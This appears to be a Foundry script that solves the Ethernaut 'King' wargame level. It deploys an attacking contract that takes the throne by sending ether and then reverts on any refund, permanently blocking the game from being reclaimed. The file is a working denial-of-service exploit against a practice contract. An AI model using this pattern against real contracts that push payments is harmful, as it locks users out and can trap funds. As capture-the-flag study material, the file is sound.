// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/king.sol";

contract KingAttack {
    King public king;

    constructor(address payable _king) payable {
        require(msg.value > 0, "No ether sent");
        (bool success, ) = _king.call{value: msg.value}("");
        require(success, "Call failed");
    }

    receive() external payable {
        revert("Attack successful");
    }
}

contract KingAttackScript is Script {
    King public king =
        King(payable(0x08b223478D117C678d4e9d08A27aa67c4683a75e));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint256 amount = king.prize();
        new KingAttack{value: amount + 1 wei}(payable(address(king)));
        vm.stopBroadcast();
    }
}
